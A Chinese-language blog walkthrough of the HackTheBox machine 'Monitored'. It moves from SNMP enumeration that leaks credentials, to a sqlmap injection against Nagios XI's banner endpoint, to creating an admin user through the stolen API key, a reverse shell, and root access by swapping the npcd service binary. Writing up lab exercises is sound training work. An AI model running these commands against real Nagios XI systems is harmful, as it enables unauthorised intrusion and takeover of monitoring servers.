@@ -1,0 +1,629 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"sun-zzz.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":200,"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="snmp协议">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Monitored">
+<meta property="og:url" content="https://sun-zzz.github.io/article/Monitored-HackTheBox.html">
+<meta property="og:site_name" content="rev1ve&#39;s blog">
+<meta property="og:description" content="snmp协议">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Monitored-HackTheBox/image-20240403182522547.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Monitored-HackTheBox/image-20240403192944296.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Monitored-HackTheBox/image-20240403194127846.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Monitored-HackTheBox/image-20240403193352038.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Monitored-HackTheBox/image-20240403194504872.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Monitored-HackTheBox/image-20240403200058890.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Monitored-HackTheBox/image-20240403200301691.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Monitored-HackTheBox/image-20240403202017508.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Monitored-HackTheBox/image-20240403202147750.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Monitored-HackTheBox/image-20240403202956326.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Monitored-HackTheBox/image-20240403203751456.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Monitored-HackTheBox/image-20240403235458293.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Monitored-HackTheBox/image-20240404000803329.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Monitored-HackTheBox/image-20240404000838169.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Monitored-HackTheBox/image-20240404000948674.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Monitored-HackTheBox/image-20240404001440760.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Monitored-HackTheBox/image-20240404003341695.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Monitored-HackTheBox/image-20240404003853008.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/Monitored-HackTheBox/image-20240404002218837.png">
+<meta property="article:published_time" content="2024-04-03T07:46:54.000Z">
+<meta property="article:modified_time" content="2024-09-01T14:41:02.349Z">
+<meta property="article:author" content="rev1ve">
+<meta property="article:tag" content="HackTheBox">
+<meta property="article:tag" content="提权">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sun-zzz.github.io/article/Monitored-HackTheBox/image-20240403182522547.png">
+
+<link rel="canonical" href="https://sun-zzz.github.io/article/Monitored-HackTheBox.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Monitored | rev1ve's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">rev1ve's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links" rel="section"><i class="fas fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://sun-zzz.github.io/article/Monitored-HackTheBox.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="rev1ve">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="rev1ve's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Monitored
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-04-03 15:46:54" itemprop="dateCreated datePublished" datetime="2024-04-03T15:46:54+08:00">2024-04-03</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-09-01 22:41:02" itemprop="dateModified" datetime="2024-09-01T22:41:02+08:00">2024-09-01</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/article/Monitored-HackTheBox.html" class="post-meta-item leancloud_visitors" data-flag-title="Monitored" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/article/Monitored-HackTheBox.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/article/Monitored-HackTheBox.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>snmp协议</p>
+<span id="more"></span>
+
+<h1 id="Monitored"><a href="#Monitored" class="headerlink" title="Monitored"></a>Monitored</h1><p><strong>信息搜集</strong></p>
+<p>nmap扫描一下端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sC -v --min-rate 1000 10.10.11.248</span><br></pre></td></tr></table></figure>
+
+<p>扫描结果如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE    SERVICE  VERSION</span><br><span class="line">22/tcp   open     ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)</span><br><span class="line">80/tcp   open     http     Apache httpd 2.4.56</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET</span><br><span class="line">|_http-title: Did not follow redirect to https://nagios.monitored.htb/</span><br><span class="line">|_http-server-header: Apache/2.4.56 (Debian)</span><br><span class="line">84/tcp   filtered ctf</span><br><span class="line">389/tcp  open     ldap     OpenLDAP 2.2.X - 2.3.X</span><br><span class="line">443/tcp  open     ssl/http Apache httpd 2.4.56 ((Debian))</span><br></pre></td></tr></table></figure>
+
+<p>注意到80端口跳转到<code>https://nagios.monitored.htb/</code>且无法访问，我们试试添加到<code>/etc/hosts</code>成功访问</p>
+<p>继续访问发现是登陆界面</p>
+<p><img src="/article/Monitored-HackTheBox/image-20240403182522547.png"></p>
+<p>然后就没有什么收获了，参考国外师傅wp是要进行 udp 扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sV -sC -v -sU 10.10.11.248</span><br></pre></td></tr></table></figure>
+
+<p>扫描结果如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PORT    STATE         SERVICE  VERSION</span><br><span class="line">68/udp  open|filtered dhcpc</span><br><span class="line">123/udp open          ntp      NTP v4 (unsynchronized)</span><br><span class="line">161/udp open          snmp     SNMPv1 server; net-snmp SNMPv3 server (public)</span><br><span class="line">162/udp open|filtered snmptrap</span><br></pre></td></tr></table></figure>
+
+<p>注意到161端口为snmp协议，我们先简单了解下两个概念</p>
+<p><strong>SNMP</strong></p>
+<blockquote>
+<p>SNMP是一种标准的网络管理协议，它允许管理员监控和管理网络设备，例如路由器、交换机、服务器等。它有三个版本分别是<code>1，c2，3</code>，主要区别在于操作类型和安全性。</p>
+</blockquote>
+<p><strong>管理信息库MIB</strong></p>
+<blockquote>
+<p>任何一个被管理的资源都表示成一个对象，称为被管理的对象。MIB是被管理对象的集合。它定义了被管理对象的一系列属性：对象的名称、对象的访问权限和对象的数据类型等。</p>
+</blockquote>
+<p>MIB文件中的变量使用的名字取自ISO和ITU管理的对象标识符（object identifier）名字空间。它是一种分级树的结构。如下图所示，第一级有三个节点：ccitt、iso、iso-ccitt。低级的对象ID分别由相关组织分配。一个特定对象的标识符可通过由根到该对象的路径获得，一般网络设备取iso节点下的对象内容。</p>
+<p>如名字空间ip结点下一个名字为ipInReceives的MIB变量被指派数字值3，那么该变量名为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iso.org.dod.internet.mgmt.mib.ip.ipInReceives</span><br></pre></td></tr></table></figure>
+
+<p>相应的数字表示（对象标识符OID，唯一标识一个MIB对象）为<code>1.3.6.1.2.1.4.3</code></p>
+<p><img src="/article/Monitored-HackTheBox/image-20240403192944296.png"></p>
+<p>回到题目，用snmpwalk进行扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snmpwalk -v 1 -c public 10.10.11.248 1.3.6.1.2.1.25</span><br></pre></td></tr></table></figure>
+
+<p>注：这里版本应该都能扫出来</p>
+<p>​		<code>public</code>为团体名，是一种简单的身份验证机制</p>
+<p>​		<code>1.3.6.1.2.1.25</code>为对象标识符OID(收集所有系统信息)</p>
+<p><img src="/article/Monitored-HackTheBox/image-20240403194127846.png"></p>
+<p>得到用户登录信息<code>svc:XjH7VCehowpR1xZB</code></p>
+<p><img src="/article/Monitored-HackTheBox/image-20240403193352038.png"></p>
+<p>不过登陆失败</p>
+<p><img src="/article/Monitored-HackTheBox/image-20240403194504872.png"></p>
+<p>我们扫一下目录发现路径<code>/nagios</code>，访问一下有登录框</p>
+<p><img src="/article/Monitored-HackTheBox/image-20240403200058890.png"></p>
+<p>成功登录</p>
+<p><img src="/article/Monitored-HackTheBox/image-20240403200301691.png"></p>
+<p>获得信息Nagios xi版本为4.4.13，找到相关漏洞</p>
+<p><img src="/article/Monitored-HackTheBox/image-20240403202017508.png"></p>
+<p>我们可以用sqlmap去注入数据库得到admin的api信息 <a target="_blank" rel="noopener" href="https://medium.com/@n1ghtcr4wl3r/nagios-xi-vulnerability-cve-2023-40931-sql-injection-in-banner-ace8258c5567">参考文章</a></p>
+<p>当然在文章中我们注意到成功需要知道cookie值</p>
+<p><img src="/article/Monitored-HackTheBox/image-20240403202147750.png"></p>
+<p>我们通过对<code>/nagiosxi</code>不断深度扫描，最终得到下面路径</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://nagios.monitored.htb/nagiosxi/api/v1/authenticate</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Monitored-HackTheBox/image-20240403202956326.png"></p>
+<p>我们bp抓包修改下请求方式，提交参数为刚刚的用户和密码</p>
+<p>得到token值<code>a7eb754b64862d9a0943c405c4d4e2717eea9d51</code></p>
+<p><img src="/article/Monitored-HackTheBox/image-20240403203751456.png"></p>
+<p>因为这里的token值会变，所以在使用sqlmap的时候用curl命令去获得</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;https://nagios.monitored.htb//nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&amp;id=3&amp;token=`curl -ks https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -d &quot;username=svc&amp;password=XjH7VCehowpR1xZB&amp;valid_min=500&quot; | awk -F&#x27;&quot;&#x27; &#x27;&#123;print$12&#125;&#x27;`&quot; --level 5 --risk 3 -p id --batch --dbs</span><br></pre></td></tr></table></figure>
+
+<p>得到admin的api后，添加用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -k &quot;https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&amp;pretty=1&quot; -d &quot;username=rev1ve&amp;password=rev1ve&amp;name=rev1ve&amp;email=rev1ve@localhost&amp;auth_level=admin&quot;</span><br></pre></td></tr></table></figure>
+
+<p>我们成功用<code>rev1ve:rev1ve</code>登录</p>
+<p><img src="/article/Monitored-HackTheBox/image-20240403235458293.png"></p>
+<p>然后<code>Configure -&gt; Core Config Manager</code>找到Command，添加反弹shell命令</p>
+<p>然后在<code>Monitoring-&gt;Hosts-&gt;localhost</code>中Run一下调用shell</p>
+<p><img src="/article/Monitored-HackTheBox/image-20240404000803329.png"></p>
+<p>成功反弹shell</p>
+<p><img src="/article/Monitored-HackTheBox/image-20240404000838169.png"></p>
+<p>得到user的flag</p>
+<p><img src="/article/Monitored-HackTheBox/image-20240404000948674.png"></p>
+<p>尝试sudo提权</p>
+<p><img src="/article/Monitored-HackTheBox/image-20240404001440760.png"></p>
+<p>试试<code>manage_services.sh</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/local/nagiosxi/scripts/manage_services.sh</span><br></pre></td></tr></table></figure>
+
+<p>执行后提示需要有参数，随便加一个status</p>
+<p><img src="/article/Monitored-HackTheBox/image-20240404003341695.png"></p>
+<p><code>manage_services.sh</code>可以控制服务，注意到npcd文件可控，并且能够以root用户执行npcd服务的开启和关闭，因此可以在npcd服务中加入一段反弹shell来提权</p>
+<p>我们先停止npcd服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/local/nagiosxi/scripts/manage_services.sh stop npcd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Monitored-HackTheBox/image-20240404003853008.png"></p>
+<p>使用wget命令下载我们的npcd文件，赋予权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x npcd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Monitored-HackTheBox/image-20240404002218837.png"></p>
+<p>然后开启<code>npcd</code>服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/local/nagiosxi/scripts/manage_services.sh start npcd</span><br></pre></td></tr></table></figure>
+
+<p>成功提权拿到root的flag</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/HackTheBox/" rel="tag"># HackTheBox</a>
+              <a href="/tags/%E6%8F%90%E6%9D%83/" rel="tag"># 提权</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/article/%E7%BA%A2%E6%98%8E%E8%B0%B72024.html" rel="prev" title="红明谷杯 2024">
+      <i class="fa fa-chevron-left"></i> 红明谷杯 2024
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/article/Pov-HackTheBox.html" rel="next" title="Pov">
+      Pov <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Monitored"><span class="nav-number">1.</span> <span class="nav-text">Monitored</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="rev1ve"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">rev1ve</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">73</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">35</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2024-03 – 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">rev1ve</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'EbJd2uGnZROX6CGHpkKNkBAj-gzGzoHsz',
+      appKey     : 'KXq3KsjxZ28WDhwbOrLlm4Yw',
+      placeholder: "快来评论叭",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : 'https://ebjd2ugn.lc-cn-n1-shared.com'
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
